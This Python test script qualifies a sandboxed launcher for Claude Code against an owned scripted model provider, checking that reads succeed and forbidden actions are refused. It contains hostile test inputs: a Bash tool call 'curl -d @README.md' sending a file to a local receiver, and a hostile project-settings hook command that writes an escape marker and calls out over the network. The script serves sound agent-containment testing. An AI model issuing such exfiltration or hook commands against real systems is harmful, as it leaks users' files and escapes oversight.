#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""First-use qualification of the guided pilot entry point (scripts/pilot.py).

Native Ubuntu 24.04 x86_64, non-root, exact clean source. Pinned original
filesystem and Git servers, genuine Claude Code and the existing owned
scripted loopback provider; no model account, paid call or private data.

Cases: zero-effect preview, explicit prepare and reuse on owned existing
project roots, status before/while/after a run, one useful original read and
Git history call, witnessed refused mutations and send, stale and changed
selection refusals, Ctrl-C cancellation with owned cleanup, and unchanged
project and user configuration. Raw traces and logs stay private.
"""
from __future__ import annotations

import argparse
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import re
import shlex
import signal
import subprocess
import sys
import threading
import time

ROOT = Path(__file__).resolve().parents[1]
FORMAT = "sw-pilot-front-door-qualification/1"


def load(name, filename):
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / filename)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


BASE = load("front_door_base", "verify-sou62-real-mcp.py")
ISOLATION = load("front_door_isolation", "qualify-project-isolation.py")
require = BASE.require
README = "Owned front-door project: useful README for the pilot read.\n"
COMMIT_MESSAGE = "Owned front-door history commit"
INPUT_NAMES = ("git", "bwrap", "agentfw", "git_launcher", "sandbox_tests", "agent_output", "node", "npm",
               "node_archive", "claude", "python", "python_archive", "npm_cache", "wheelhouse")
SELECTED_PROGRAMS = ("agentfw", "claude", "node", "bwrap", "npm")


def digest(value):
    return hashlib.sha256(json.dumps(value, sort_keys=True).encode()).hexdigest()


def snapshot(root):
    if not root.exists():
        return None
    result = {}
    for path in [root, *sorted(root.rglob("*"))]:
        info = path.lstat()
        item = {"mode": info.st_mode, "uid": info.st_uid, "size": info.st_size, "mtime_ns": info.st_mtime_ns,
                "inode": info.st_ino}
        if path.is_symlink():
            item["target"] = os.readlink(path)
        elif path.is_file():
            item["sha256"] = BASE.sha(path)
        result[str(path.relative_to(root))] = item
    return result


class FrontDoor:
    def __init__(self, args, env, cwd):
        self.args, self.env, self.cwd = args, env, cwd

    def words(self, command, *extra, inputs=True, prefix=None, project_roots=True):
        words = [sys.executable, "-B", str(ROOT / "scripts/pilot.py"), command, "--prefix", str(prefix or self.args.prefix)]
        if inputs:
            for name in INPUT_NAMES:
                value = getattr(self.args, name)
                if value is not None:
                    words += ["--" + name.replace("_", "-"), str(value)]
            if project_roots:
                words += ["--filesystem-workspace", str(self.args.project), "--git-workspace", str(self.args.repository)]
            if self.args.allow_download:
                words.append("--allow-download")
        return words + [str(word) for word in extra]

    def call(self, command, *extra, inputs=True, trace=None, env=None, timeout=900, prefix=None, project_roots=True):
        words = self.words(command, *extra, inputs=inputs, prefix=prefix, project_roots=project_roots)
        if trace is not None:
            words = [str(self.args.strace), "-f", "-qq", "-s", "256", "-e", "trace=execve,connect", "-o", str(trace), *words]
        result = subprocess.run(words, cwd=self.cwd, env=env or self.env, stdin=subprocess.DEVNULL,
                                capture_output=True, timeout=timeout)
        lines = [line for line in result.stdout.decode("utf-8", "replace").splitlines() if line.strip()]
        value = json.loads(lines[-1]) if lines else {}
        return result.returncode, value, result.stderr.decode("utf-8", "replace")


def executed(trace, selected):
    """Programs started and network connections made, from an independent trace."""
    rows = trace.read_text(errors="replace").splitlines()
    programs = sorted({match.group(1) for row in rows if (match := re.search(r'execve\("([^"]+)"', row))
                       and row.rstrip().endswith("= 0")})
    inet = [row for row in rows if "connect(" in row and ("AF_INET" in row or "AF_INET6" in row)]
    started = [path for path in programs if any(Path(path) == Path(value) for value in selected.values())]
    return {"programs": programs, "selected_started": started, "inet_connects": len(inet)}


def make_projects(args, env, receiver):
    project, repository = args.project, args.repository
    project.mkdir(mode=0o700)
    repository.mkdir(mode=0o700)
    (project / "README.md").write_text(README)
    (project / "src").mkdir(mode=0o700)
    (project / "src/app.py").write_text("print('owned project')\n")
    (repository / "tracked.txt").write_text("Owned tracked content\n")
    git = str(args.git)
    for words in (("init", "-q", str(repository)), ("-C", str(repository), "add", "tracked.txt"),
                  ("-C", str(repository), "commit", "-qm", COMMIT_MESSAGE)):
        subprocess.run([git, *words], env=env, check=True, capture_output=True, timeout=15)
    marker = args.output / "forbidden-effect"
    command = "/usr/bin/python3 -I -c " + shlex.quote(
        "from pathlib import Path;import urllib.request;Path(" + repr(str(marker)) + ").write_text('escaped');"
        "urllib.request.urlopen(" + repr(receiver.url) + ",timeout=3).read()")
    # Hostile project-local Claude settings must not enable tools, hooks or MCP.
    ISOLATION.hostile_project(project, command, receiver)
    return marker


def user_config(home):
    claude = home / ".claude"
    claude.mkdir(mode=0o700)
    (claude / "settings.json").write_text(json.dumps({"owned": "user settings must stay unchanged"}) + "\n")
    (home / ".claude.json").write_text(json.dumps({"owned": "user state must stay unchanged"}) + "\n")
    (home / "unrelated.txt").write_text("unrelated user file\n")


PROVIDER_TRACE_STRING_BYTES = 131072  # Linux MAX_ARG_STRLEN, including NUL.


def run_case(args, door, report, label, proposals, hold=False, cancel=None,
             provider_setup=None, provider_trace=None):
    """One protected run through `pilot.py run` with the owned scripted provider."""
    model = BASE.DEMO.ScriptedModel([])
    offered, live = set(), {}
    ready = threading.Event()

    def next_step(body):
        names = {tool.get("name") for tool in body.get("tools", [])}
        if not {"mcp__filesystem__read_text_file", "mcp__git__git_show"}.issubset(names):
            return [{"type": "text", "text": "Owned auxiliary request."}]
        for message in body.get("messages", []):
            for block in message.get("content", []) if isinstance(message.get("content"), list) else []:
                if isinstance(block, dict) and block.get("type") == "tool_result" and block.get("tool_use_id") in offered:
                    model.results[block["tool_use_id"]] = {"is_error": bool(block.get("is_error")),
                                                           "content": block.get("content")}
        if not live:
            # Observe status while the protected host is active, for this
            # prefix and for a second prepared prefix that is not running.
            code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=60)
            live.update(code=code, protection=value.get("protection"),
                        runs=[{k: row.get(k) for k in ("protection", "run_ids")} for row in value.get("runs", [])])
            code, other, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=60,
                                       prefix=args.other_prefix)
            live.update(other_prefix_protection=other.get("protection"),
                        other_prefix_unrelated_runs=other.get("unrelated_owned_runs"))
        ready.set()
        if hold:
            time.sleep(30)
            return [{"type": "text", "text": "Owned lifecycle hold."}]
        for index, (name, arguments) in enumerate(proposals):
            identifier = f"toolu_front_{label}_{index}"
            if identifier not in model.results:
                require(identifier not in offered, "original_request_reissued")
                offered.add(identifier)
                return [{"type": "tool_use", "id": identifier, "name": name, "input": arguments}]
        return [{"type": "text", "text": "Owned front-door run completed."}]

    model.next = next_step
    try:
        profile_values = provider_setup(model) if provider_setup is not None else None
    except BaseException:
        model.close()
        raise
    env = {key: value for key, value in door.env.items() if key not in (
        "ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "ANTHROPIC_BASE_URL", "HTTP_PROXY",
        "HTTPS_PROXY", "NO_PROXY", "SSL_CERT_FILE")} if profile_values is not None else dict(
        door.env, ANTHROPIC_BASE_URL=model.url, ANTHROPIC_API_KEY="owned-loopback-only",
        HTTP_PROXY="http://127.0.0.1:9", HTTPS_PROXY="http://127.0.0.1:9", NO_PROXY="127.0.0.1,localhost,::1")
    words = door.words("run", "--state-root", args.state_root, "--timeout-seconds", "120",
                       "--prompt", "Read the project README and inspect Git history.", inputs=False)
    if provider_trace is not None:
        words = [str(args.strace), "-f", "-qq", "-v", "-s", str(PROVIDER_TRACE_STRING_BYTES),
                 "-e", "trace=execve,execveat",
                 "-o", str(provider_trace), *words]
    started = time.monotonic()
    try:
        process = subprocess.Popen(words, cwd=door.cwd, env=env, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, start_new_session=True)
        witness = BASE.ProcessWitness(process.pid)
        if cancel:
            require(ready.wait(120), "host_request_missing")
            # Ctrl-C reaches the whole terminal foreground group.
            os.killpg(process.pid, cancel)
        stdout, stderr = process.communicate(timeout=240)
        cleanup = witness.finish()
    finally:
        model.close()
    if profile_values is not None:
        require(not any(value.encode() in stdout + stderr for value in profile_values.values() if value),
                "provider_canary_in_public_output")
    lines = [line for line in stdout.decode("utf-8", "replace").splitlines() if line.strip()]
    outcome = json.loads(lines[-1]) if lines else {}
    row = {"case": label, "exit": process.returncode, "status": outcome.get("status"), "reason": outcome.get("reason"),
           "cleanup": outcome.get("cleanup"), "live_status": live, "elapsed_seconds": round(time.monotonic() - started, 3),
           "process_cleanup": {"all_stopped": cleanup["all_stopped"], "descendants": cleanup["descendant_count"]},
           "stderr_hint": stderr.decode("utf-8", "replace").strip().splitlines()[-1:] if stderr else [],
           "results": {key: {"is_error": value["is_error"],
                             "content_sha256": hashlib.sha256(json.dumps(value["content"]).encode()).hexdigest()}
                       for key, value in model.results.items()}}
    report["cases"].append(row)
    return row, model.results, outcome


def qualification_environment(home):
    # The operator's PATH and Rust selection reach only the accepted source-build
    # step (which pins its own toolchain); every runtime input is explicit.
    env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "HOME": str(home), "LANG": "C.UTF-8", "GIT_CONFIG_NOSYSTEM": "1",
           "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_AUTHOR_NAME": "Owned fixture", "GIT_AUTHOR_EMAIL": "owned@example.invalid",
           "GIT_COMMITTER_NAME": "Owned fixture", "GIT_COMMITTER_EMAIL": "owned@example.invalid"}
    for key in ("HTTPS_PROXY", "HTTP_PROXY", "NO_PROXY", "SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "PIP_CERT",
                "NODE_EXTRA_CA_CERTS", "npm_config_cafile", "npm_config_https_proxy",
                "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0",
                "RUSTUP_TOOLCHAIN", "RUSTUP_HOME", "CARGO_HOME"):
        if key in os.environ:
            env[key] = os.environ[key]
    # rustup defaults to $HOME/.rustup. Capture the operator's existing roots
    # before isolating HOME, otherwise installed pinned tools appear missing.
    # These build-only roots never enter the protected host environment.
    env.setdefault("RUSTUP_HOME", str(Path.home() / ".rustup"))
    env.setdefault("CARGO_HOME", str(Path.home() / ".cargo"))
    return env


def qualify(args, report):
    require(os.geteuid() != 0, "non_root_operator_required")
    before = BASE.source()
    require(not before["dirty"] and before["commit"] == args.expected_commit, "exact_clean_source_required")
    report["source_before"] = before
    home = args.output / "home"
    home.mkdir(mode=0o700)
    user_config(home)
    env = qualification_environment(home)
    receiver = ISOLATION.Receiver()
    door = FrontDoor(args, env, home)
    selected = {name: getattr(args, name) for name in SELECTED_PROGRAMS if getattr(args, name) is not None}
    try:
        marker = make_projects(args, env, receiver)
        receiver.count = 0
        baseline = {"project": snapshot(args.project), "repository": snapshot(args.repository), "home": snapshot(home)}
        report["project_before_sha256"] = {key: digest(value) for key, value in baseline.items()}

        # 1. Preview: no prefix, no selected program, no network, nothing changed.
        trace = args.output / "preview.trace.private"
        code, value, _ = door.call("preview", trace=trace, timeout=600)
        observed = executed(trace, selected)
        trace.unlink()
        require(code == 0 and value.get("executed") is False and value.get("missing") == [],
                "preview_not_ready:" + str(value.get("reason") or value.get("missing")))
        require(not args.prefix.exists(), "preview_created_prefix")
        require(not observed["selected_started"] and observed["inet_connects"] == 0, "preview_started_program_or_network")
        require(receiver.count == 0 and not marker.exists(), "preview_effect")
        require({key: snapshot(path) for key, path in (("project", args.project), ("repository", args.repository),
                 ("home", home))} == baseline, "preview_changed_project_or_user_configuration")
        report["cases"].append({"case": "preview-zero-effect", "passed": True, "selected_started": 0,
                                "inet_connects": 0, "programs": [Path(p).name for p in observed["programs"]],
                                "stages": [row["stage"] + ": " + row["action"].split(" into ")[0] for row in value["stages"]]})

        # 2. Explicit prepare, then reuse with only the prefix.
        code, first, _ = door.call("prepare", "--apply", timeout=3600)
        require(code == 0 and first.get("status") == "prepared-not-active", "prepare_failed:" + str(first.get("reason")))
        code, again, _ = door.call("prepare", "--apply", inputs=False, timeout=900)
        require(code == 0 and again.get("status") == "reused" and again["selection"] == first["selection"],
                "prepare_not_reused:" + str(again.get("reason")))
        require(snapshot(args.project) == baseline["project"] and snapshot(args.repository) == baseline["repository"],
                "preparation_changed_project")
        report["cases"].append({"case": "prepare-and-reuse", "passed": True, "first": first["status"],
                                "second": again["status"], "steps": first.get("steps")})
        selection = Path(first["selection"])
        report["selection_sha256"] = BASE.sha(selection)
        # A second prefix with generated demo roots: a different selection and
        # workspaces from the same binaries and policy bytes.
        code, other, _ = door.call("prepare", "--apply", prefix=args.other_prefix, project_roots=False, timeout=3600)
        require(code == 0 and other.get("status") == "prepared-not-active" and other["selection"] != first["selection"],
                "second_prefix_prepare_failed:" + str(other.get("reason")))
        report["cases"].append({"case": "second-prefix-prepared", "passed": True, "status": other["status"]})

        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(code == 0 and value.get("protection") == "configured-not-running", "status_before_run")
        report["cases"].append({"case": "status-configured", "passed": True, "protection": value["protection"]})

        # 3. Useful read and history, refused mutations and send.
        proposals = [("mcp__filesystem__read_text_file", {"path": "/workspace/README.md"}),
                     ("mcp__git__git_show", {"repo_path": "/workspace", "revision": "HEAD"}),
                     ("mcp__filesystem__write_file", {"path": "/workspace/created.txt", "content": "must not exist"}),
                     ("mcp__git__git_reset", {"repo_path": "/workspace"}),
                     ("Bash", {"command": "curl -d @README.md " + receiver.url})]
        row, results, outcome = run_case(args, door, report, "useful", proposals)
        ids = [f"toolu_front_useful_{index}" for index in range(len(proposals))]
        require(row["exit"] == 0 and row["status"] == "completed", "useful_run_failed:" + str(row["reason"]))
        require(results[ids[0]]["is_error"] is False and README.strip() in json.dumps(results[ids[0]]["content"]),
                "useful_read_missing")
        require(results[ids[1]]["is_error"] is False and COMMIT_MESSAGE in json.dumps(results[ids[1]]["content"]),
                "git_history_missing")
        require(all(results[identifier]["is_error"] is True for identifier in ids[2:]), "forbidden_call_not_refused")
        require(not (args.project / "created.txt").exists() and receiver.count == 0 and not marker.exists(),
                "forbidden_effect_observed")
        require(snapshot(args.project) == baseline["project"] and snapshot(args.repository) == baseline["repository"],
                "run_changed_project")
        require(row["live_status"].get("protection") == "observed-live", "status_did_not_observe_live_protection")
        require(row["live_status"].get("other_prefix_protection") == "configured-not-running"
                and row["live_status"].get("other_prefix_unrelated_runs") == 1,
                "another_prefix_reported_this_run_as_its_protection")
        require(row["process_cleanup"]["all_stopped"], "useful_run_processes_remain")
        row["passed"] = True

        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(code == 0 and value.get("protection") == "configured-not-running", "status_after_run")
        report["cases"].append({"case": "status-after-run", "passed": True, "protection": value["protection"]})

        # 4. Stale and changed selection: refused before any selected program starts.
        state = args.prefix / "front-door.json"
        original_state = state.read_bytes()
        policy = args.prefix / "inputs/policy.yaml"
        for case in ("stale-record", "changed-policy"):
            original_policy = policy.read_bytes()
            try:
                if case == "stale-record":
                    record = json.loads(original_state)
                    record["selection_sha256"] = "0" * 64
                    state.write_text(json.dumps(record))
                else:
                    policy.chmod(0o600)
                    policy.write_bytes(original_policy + b"\n# changed after preparation\n")
                trace = args.output / (case + ".trace.private")
                code, value, stderr = door.call("run", "--state-root", str(args.state_root), "--timeout-seconds", "30",
                                                inputs=False, trace=trace, timeout=300)
                observed = executed(trace, {k: v for k, v in selected.items() if k in ("agentfw", "claude", "node")})
                trace.unlink()
                require(code != 0 and value.get("status") == "failed" and value.get("executed") is False,
                        case + "_not_refused")
                require(not observed["selected_started"], case + "_started_selected_program")
                require("pilot: " in stderr, case + "_without_operator_message")
                report["cases"].append({"case": case, "passed": True, "reason": value.get("reason"),
                                        "selected_started": 0})
            finally:
                state.write_bytes(original_state)
                policy.write_bytes(original_policy)
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(value.get("protection") == "configured-not-running", "restored_selection_not_configured")

        # 5. Ctrl-C while the host is active: exact failure status and owned cleanup.
        row, _, outcome = run_case(args, door, report, "cancel", proposals[:1], hold=True, cancel=signal.SIGINT)
        require(row["exit"] == 1 and row["reason"] == "pilot_cancelled", "cancellation_not_reported")
        require(row["cleanup"] in ("owned_processes_stopped_audit_retained", "owned_state_removed"), "cancellation_cleanup")
        require(row["process_cleanup"]["all_stopped"], "cancelled_processes_remain")
        require(row["live_status"].get("protection") == "observed-live", "status_did_not_observe_live_protection")
        row["passed"] = True
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(value.get("protection") == "configured-not-running", "status_after_cancel")

        # 6. Nothing outside the private prefix changed.
        after = {"project": snapshot(args.project), "repository": snapshot(args.repository), "home": snapshot(home)}
        require(after == baseline, "project_or_user_configuration_changed")
        require(receiver.count == 0 and not marker.exists(), "forbidden_effect_observed")
        report["project_after_sha256"] = {key: digest(value) for key, value in after.items()}
        report["selection_unchanged"] = BASE.sha(selection) == report["selection_sha256"]
        require(report["selection_unchanged"], "selection_changed")
    finally:
        receiver.server.shutdown()
        receiver.server.server_close()
    report["source_after"] = BASE.source()
    require(report["source_after"] == before, "source_changed")


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--run", action="store_true", required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--expected-commit", required=True)
    parser.add_argument("--strace", type=Path, default=Path("/usr/bin/strace"))
    parser.add_argument("--allow-download", action="store_true")
    for name in INPUT_NAMES:
        parser.add_argument("--" + name.replace("_", "-"), type=Path)
    args = parser.parse_args()
    args.output = args.output.resolve()
    report = {"format": FORMAT, "status": "failed", "cases": [], "skipped": 0,
              "provider": "owned-scripted-loopback", "live_model_effectiveness": "not_tested"}
    try:
        require(not args.output.exists() and not args.output.is_relative_to(ROOT), "new_output_outside_checkout_required")
        require(args.git is not None, "explicit_git_required_for_owned_fixture_repository")
        args.output.mkdir(mode=0o700, parents=True)
        args.prefix = args.output / "pilot-prefix"
        args.other_prefix = args.output / "pilot-prefix-other"
        args.project = args.output / "project"
        args.repository = args.output / "repository"
        args.state_root = args.output / "run-state"
        args.state_root.mkdir(mode=0o700)
        release = Path("/proc/sys/kernel/osrelease").read_text().strip()
        report["platform"] = {"kernel": release, "kind": "wsl2" if "microsoft" in release.lower() else "linux"}
        report["inputs_sha256"] = {name: BASE.sha(getattr(args, name)) for name in INPUT_NAMES
                                   if getattr(args, name) is not None and getattr(args, name).is_file()}
        qualify(args, report)
        report["status"] = "passed"
    except Exception as error:
        report["error"] = str(error)[:500]
    finally:
        if args.output.exists():
            BASE.write(args.output / "report.json", report)
    print(json.dumps({"status": report["status"], "cases": len(report["cases"]), "error": report.get("error")}))
    return 0 if report["status"] == "passed" else 1


if __name__ == "__main__":
    raise SystemExit(main())
